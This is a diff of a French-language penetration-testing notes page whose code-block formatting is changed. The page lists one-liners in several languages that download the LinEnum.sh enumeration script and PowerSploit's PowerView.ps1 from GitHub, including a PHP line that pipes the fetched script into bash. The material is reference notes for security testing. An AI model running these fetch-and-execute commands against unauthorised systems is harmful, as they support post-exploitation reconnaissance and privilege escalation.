@@ -7604,60 +7604,60 @@
   <h1>Différents langages</h1>
 
 <p>Python 2.7:</p>
-<pre><code class="language-bash">python2.7 -c 'import urllib;urllib.urlretrieve (&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)'
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>python2.7<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import urllib;urllib.urlretrieve (&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)&#39;</span>
+</span></code></pre></div>
 <p>Python3:</p>
-<pre><code class="language-bash">python3 -c 'import urllib.request;urllib.request.urlretrieve(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)'
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import urllib.request;urllib.request.urlretrieve(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;)&#39;</span>
+</span></code></pre></div>
 <p>PHP:</p>
-<pre><code class="language-bash">php -r '$file = file_get_contents(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);'
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$file = file_get_contents(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);&#39;</span>
+</span></code></pre></div>
 <p>PHP:</p>
-<pre><code class="language-bash">php -r 'const BUFFER = 1024; $fremote = 
-fopen(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;rb&quot;); $flocal = fopen(&quot;LinEnum.sh&quot;, &quot;wb&quot;); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;const BUFFER = 1024; $fremote = </span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="s1">fopen(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;rb&quot;); $flocal = fopen(&quot;LinEnum.sh&quot;, &quot;wb&quot;); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);&#39;</span>
+</span></code></pre></div>
 <p>PHP (puis exécution par bash):</p>
-<pre><code class="language-bash">php -r '$lines = @file(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); foreach ($lines as $line_num =&gt; $line) { echo $line; }' | bash
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$lines = @file(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;); foreach ($lines as $line_num =&gt; $line) { echo $line; }&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>bash
+</span></code></pre></div>
 <p>Ruby:</p>
-<pre><code class="language-bash">ruby -e 'require &quot;net/http&quot;; File.write(&quot;LinEnum.sh&quot;, Net::HTTP.get(URI.parse(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;)))'
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ruby<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;require &quot;net/http&quot;; File.write(&quot;LinEnum.sh&quot;, Net::HTTP.get(URI.parse(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;)))&#39;</span>
+</span></code></pre></div>
 <p>Perl:</p>
-<pre><code class="language-bash">perl -e 'use LWP::Simple; getstore(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;);'
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;use LWP::Simple; getstore(&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;, &quot;LinEnum.sh&quot;);&#39;</span>
+</span></code></pre></div>
 <p>Windows, via création d'un fichier "wget.js" (Javascript):</p>
-<pre><code class="language-powershell">contenu wget.js:
-var WinHttpReq = new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);
-WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), /*async=*/false);
-WinHttpReq.Send();
-BinStream = new ActiveXObject(&quot;ADODB.Stream&quot;);
-BinStream.Type = 1;
-BinStream.Open();
-BinStream.Write(WinHttpReq.ResponseBody);
-BinStream.SaveToFile(WScript.Arguments(1));
-
-Puis:
-
-cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">contenu</span> <span class="n">wget</span><span class="p">.</span><span class="n">js</span><span class="p">:</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">var</span> <span class="n">WinHttpReq</span> <span class="p">=</span> <span class="n">new</span> <span class="n">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;WinHttp.WinHttpRequest.5.1&quot;</span><span class="p">);</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="n">WinHttpReq</span><span class="p">.</span><span class="n">Open</span><span class="p">(</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="n">WScript</span><span class="p">.</span><span class="n">Arguments</span><span class="p">(</span><span class="n">0</span><span class="p">),</span> <span class="p">/*</span><span class="n">async</span><span class="p">=*/</span><span class="n">false</span><span class="p">);</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="n">WinHttpReq</span><span class="p">.</span><span class="n">Send</span><span class="p">();</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="n">BinStream</span> <span class="p">=</span> <span class="n">new</span> <span class="n">ActiveXObject</span><span class="p">(</span><span class="s2">&quot;ADODB.Stream&quot;</span><span class="p">);</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="n">BinStream</span><span class="p">.</span><span class="nb">Type </span><span class="p">=</span> <span class="n">1</span><span class="p">;</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="n">BinStream</span><span class="p">.</span><span class="n">Open</span><span class="p">();</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="n">BinStream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">WinHttpReq</span><span class="p">.</span><span class="n">ResponseBody</span><span class="p">);</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="n">BinStream</span><span class="p">.</span><span class="n">SaveToFile</span><span class="p">(</span><span class="n">WScript</span><span class="p">.</span><span class="n">Arguments</span><span class="p">(</span><span class="n">1</span><span class="p">));</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="n">Puis</span><span class="p">:</span>
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="n">cscript</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">nologo</span> <span class="n">wget</span><span class="p">.</span><span class="n">js</span> <span class="n">https</span><span class="p">://</span><span class="n">raw</span><span class="p">.</span><span class="n">githubusercontent</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">PowerShellMafia</span><span class="p">/</span><span class="n">PowerSploit</span><span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">Recon</span><span class="p">/</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span> <span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
+</span></code></pre></div>
 <p>Windows, via création d'un fichier "wget.vbs" (VBScript):</p>
-<pre><code class="language-powershell">Contenu wget.vbs
-dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
-dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
-xHttp.Open &quot;GET&quot;, WScript.Arguments.Item(0), False
-xHttp.Send
-
-with bStrm
-    .type = 1
-    .open
-    .write xHttp.responseBody
-    .savetofile WScript.Arguments.Item(1), 2
-end with
-
-Puis:
-
-cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
-</code></pre>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">Contenu</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">dim</span> <span class="n">xHttp</span><span class="p">:</span> <span class="nb">Set </span><span class="n">xHttp</span> <span class="p">=</span> <span class="n">createobject</span><span class="p">(</span><span class="s2">&quot;Microsoft.XMLHTTP&quot;</span><span class="p">)</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">dim</span> <span class="n">bStrm</span><span class="p">:</span> <span class="nb">Set </span><span class="n">bStrm</span> <span class="p">=</span> <span class="n">createobject</span><span class="p">(</span><span class="s2">&quot;Adodb.Stream&quot;</span><span class="p">)</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="n">xHttp</span><span class="p">.</span><span class="n">Open</span> <span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="n">WScript</span><span class="p">.</span><span class="n">Arguments</span><span class="p">.</span><span class="n">Item</span><span class="p">(</span><span class="n">0</span><span class="p">),</span> <span class="n">False</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="n">xHttp</span><span class="p">.</span><span class="n">Send</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="n">with</span> <span class="n">bStrm</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>    <span class="p">.</span><span class="nb">type </span><span class="p">=</span> <span class="n">1</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>    <span class="p">.</span><span class="n">open</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>    <span class="p">.</span><span class="nb">write </span><span class="n">xHttp</span><span class="p">.</span><span class="n">responseBody</span>
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>    <span class="p">.</span><span class="n">savetofile</span> <span class="n">WScript</span><span class="p">.</span><span class="n">Arguments</span><span class="p">.</span><span class="n">Item</span><span class="p">(</span><span class="n">1</span><span class="p">),</span> <span class="n">2</span>
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="k">end</span> <span class="n">with</span>
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="n">Puis</span><span class="p">:</span>
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a><span class="n">cscript</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">nologo</span> <span class="n">wget</span><span class="p">.</span><span class="n">vbs</span> <span class="n">https</span><span class="p">://</span><span class="n">raw</span><span class="p">.</span><span class="n">githubusercontent</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">PowerShellMafia</span><span class="p">/</span><span class="n">PowerSploit</span><span class="p">/</span><span class="n">dev</span><span class="p">/</span><span class="n">Recon</span><span class="p">/</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span> <span class="n">PowerView2</span><span class="p">.</span><span class="n">ps1</span>
+</span></code></pre></div>
 
 
 
@@ -7704,7 +7704,7 @@ cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/P
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
